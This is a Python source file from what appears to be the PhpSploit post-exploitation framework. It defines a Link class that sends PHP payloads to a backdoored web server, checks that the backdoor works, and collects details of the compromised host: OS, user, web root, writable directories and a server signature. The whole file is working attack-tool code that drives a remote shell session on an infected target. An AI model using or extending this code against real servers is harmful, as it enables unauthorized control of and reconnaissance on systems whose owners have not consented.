import network.sender
from functions import *

class Link:
    """create a link through phpsploit client and backdoored server

    """
    success = False

    def __init__(self, CNF):
        self.CNF  = CNF
        self.is_first_payload = False
        self.req_err = 'Error connecting to the target'
        self.exc_err = 'The target does not seem to be infected'


    def open(self):
        """used by the remote shell starter, is send the initial
        payload, in charge of collecting the needed servers vars
        and making sure the backdooor correctly works.

        """
        self.is_first_payload = True
        return(self._link('open'))


    def check(self):
        """like the open() method, but it is also designed to check
        if the checking Link is on the same server than the currently
        opened remote shell session. The server's 'signature' it used for it

        """
        err_tpl = 'Settings error: %s: ' %quot('TARGET')
        self.req_err = err_tpl+'Communication impossible'
        self.exc_err = err_tpl+'Needs to be a backdoored URL'

        if not self._link('open'):
            return(False)

        old_srv = self.CNF['SRV']['signature']
        new_srv = self.srv_vars['signature']
        if new_srv != old_srv:
            self._error(err_tpl+'Is not owned by the same server')
            return(False)

        return(True)


    def close(self):
        """close the virtual link, actually, juste return the
        link closed's string

        """
        print(P_inf+'Connection to %s closed.' %self.CNF['LNK']['DOMAIN'])
        return(True)


    def _link(self, _type='open'):
        """estabilish the given link type"""

        payload = 'framework/phpfiles/server_link/%s.php' % _type
        payload = getpath(payload).phpcode()
        return(self._send(payload))


    def _send(self, payload):
        """send the link payload to the server, and determine it's signature
        """
        link = network.sender.Load(self.CNF)
        link.is_first_payload = self.is_first_payload
        link.open(payload)
        if self._error(link):
            return(False)
        self.success = True
        env = self._get_env(link.read())
        srv = self._build_vars(env)
        #srv['ENV'] = env
        self.srv_vars  = srv
        self.signature = srv['signature']
        return(True)


    def _error(self, obj):
        """checks if the given object have an error var,
        and output it with correct format

        """
        error = ''
        try:
            error = obj.error
        except:
            print( P_err+obj )
        if not error:
            return(False)

        if error == 'request':
            print( P_err+self.req_err )
        if error == 'execution':
            print( P_err+self.exc_err )

        return(True)


    def _get_env(self, env):
        """collect the server's php environment"""

        result = list()
        for name, value in env.items():
            #if value and (name not in self.env_blacklist):
            value = str(value)
            value = value.strip()
            result.append((name, value))
        return dict(result)


    def _build_vars(self, env):
        """collect the server related vars, usefull for further
        plugins usage and framework management.
        written at self.CNF['SRV'] on the interface's core.

        """
        def get(options, default=''):
            for choice in options:
                if choice in env:
                    if env[choice].strip():
                        return(env[choice])
            return(default)

        srv = dict()

        srv['client_addr'] = get(['REMOTE_ADDR', 'REMOTE_HOST'])

        srv['host'] = get(['SERVER_NAME', 'HTTP_HOST'],
                          self.CNF['LNK']['DOMAIN'])

        srv['addr'] = get(['SERVER_ADDR', 'LOCAL_ADDR'], srv['host'])

        srv['port'] = get(['SERVER_PORT'], '80')

        srv['os'] = get(['OS', 'PHP_OS'], 'unknow')

        srv['user'] =(get(['WHOAMI', 'USERNAME', 'USER']) or
                      get(['USERPROFILE'], 'unknow').split('\\')[-1])

        srv['soft'] = get(['SERVER_SOFTWARE'], 'unknow software')

        srv['phpver'] = get(['PHP_VERSION'], '?')

        srv['webroot'] = get(['WEBROOT'])

        srv['home'] = get(['HOME'], srv['webroot'])

        srv['write_webdir'] = get(['W_WEBDIR'])

        srv['write_tmpdir'] = get(['W_TMPDIR'])

        # enclose ipv6 addresses with brackets for visibility
        if ":" in srv['client_addr']:
            srv['client_addr'] = "[%s]" %srv['client_addr']
        if ":" in srv['addr']:
            srv['addr'] = "[%s]" %srv['addr']

        # attempt to determine home dir if not known
        if not srv['home']:
            path = get(['SCRIPT_FILENAME', 'PATH_TRANSLATED'])
            sep = '\\'
            if not path:
                path = '/'
            else:
                if path[0] == '/': sep = '/'
                path = sep.join(path.split(sep)[0:-1])
            srv['home'] = path

        # determine remote system's path separator
        srv['separator'] = '\\'
        if srv['home'].startswith('/'):
            srv['separator'] = '/'

        # get remote system's os platform
        srv['platform'] = 'nix'
        if srv['separator'] == '\\':
            srv['platform'] = 'win'

        # determine the remote server signature
        from hashlib import md5
        sig = srv['os']+srv['phpver']+srv['platform']+srv['soft']
        srv['signature'] = md5(sig).hexdigest()

        return(srv)
